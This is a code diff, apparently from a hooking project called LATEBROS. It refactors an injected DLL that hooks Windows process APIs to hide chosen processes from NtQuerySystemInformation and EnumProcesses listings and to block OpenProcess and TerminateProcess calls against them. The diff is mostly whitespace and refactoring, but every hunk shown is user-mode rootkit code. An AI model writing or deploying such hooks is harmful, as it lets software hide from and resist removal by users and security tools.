@@ -1,6 +1,5 @@
 ﻿#include "stdafx.h"
 
-
 /*
 * Function: KERNEL32!TerminateProcess
 * Purpose: Protect any LATEBROS process from conventional termination
@@ -43,7 +42,7 @@ extern "C" NTSTATUS __declspec(dllexport) NTAPI ntterm(HANDLE process_handle, NT
 	// SOMETIMES THEY OPEN A HANDLE WITH ONLY THE TERMINATE FLAG RIGHT (PROCESSHACKER FOR EXAMPLE)
 	// WE CAN NOT DO ANYTHING ABOUT THIS, BUT WE ALREADY PREVENT OPENING HANDLE SO THIS IS ONLY
 	// A FAIL SAFE
-	
+
 	auto process_id = GetProcessId(process_handle);
 	auto temp_handle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, false, process_id);
 
@@ -173,8 +172,8 @@ extern "C" NTSTATUS __declspec(dllexport) WINAPI qsi(SYSTEM_INFORMATION_CLASS sy
 	if (!NT_SUCCESS(result))
 		return result;
 
-	if (system_information_class == SystemProcessInformation 
-		|| system_information_class == static_cast<_SYSTEM_INFORMATION_CLASS>(53)/*SystemSessionProcessInformation*/ 
+	if (system_information_class == SystemProcessInformation
+		|| system_information_class == static_cast<_SYSTEM_INFORMATION_CLASS>(53)/*SystemSessionProcessInformation*/
 		|| system_information_class == static_cast<_SYSTEM_INFORMATION_CLASS>(57)/*SystemExtendedProcessInformation*/)
 	{
 		auto entry = reinterpret_cast<_SYSTEM_PROCESS_INFO*>(system_information);
@@ -213,7 +212,8 @@ extern "C" BOOL __declspec(dllexport) WINAPI enump(DWORD* process_ids, DWORD cb,
 	if (!result)
 		return false; // NO NEED TO DO ANYTHING IF THE FUNCTION FAILS
 
-					  // PARSE ORIGINAL LIST
+	
+    // PARSE ORIGINAL LIST
 	auto process_list = std::unordered_set<DWORD>();
 	for (size_t process_index = 0; process_index < *bytes_returned_ptr / sizeof(DWORD)/*ENTRY SIZE*/; process_index++)
 		process_list.insert(process_ids[process_index]);
@@ -260,34 +260,31 @@ extern "C" FARPROC  __declspec(dllexport) WINAPI gpa(HMODULE module, LPCSTR proc
 	char module_name_buffer[50] = {};
 	GetModuleBaseNameA(GetCurrentProcess(), module, module_name_buffer, sizeof(module_name_buffer));
 
-	auto module_name = std::string(module_name_buffer);
-
-	std::string module_database[ MAX_MODULE_SEARCH_PARAM ] =
+	std::string module_database[MAX_MODULE_SEARCH_PARAM] =
 	{
 		{ "kernel32.dll" },
 		{ "ntdll.dll" }
 	};
 
-	std::unordered_map< std::string, FARPROC > hook_database =
+	std::unordered_map<std::string, void*> hook_database =
 	{
-		{ "OpenProcess", reinterpret_cast< FARPROC >( op ) },
-		{ "TerminateProcess", reinterpret_cast< FARPROC >( kterm ) },
-		{ "GetProcAddress", reinterpret_cast< FARPROC >( gpa ) },
-		{ "NtOpenProcess", reinterpret_cast< FARPROC >( ntop ) },
-		{ "NtTerminateProcess", reinterpret_cast< FARPROC >( ntterm ) }
+		{ "OpenProcess", op },
+		{ "TerminateProcess", kterm },
+		{ "GetProcAddress", gpa },
+		{ "NtOpenProcess", ntop },
+		{ "NtTerminateProcess", ntterm }
 	};
 
-	for( const auto &mod : module_database )
+	auto module_name = std::string(module_name_buffer);
+	for (const auto &mod : module_database)
 	{
-		if( module_name == mod )
+		if (module_name != mod)
+			continue;
+
+		for (const auto&[name, address] : hook_database)
 		{
-			for( const auto &[name, address] : hook_database )
-			{
-				if( procedure_name == name )
-				{
-					return address;
-				}
-			}
+			if (procedure_name == name)
+				return reinterpret_cast<FARPROC>(address);
 		}
 	}
 
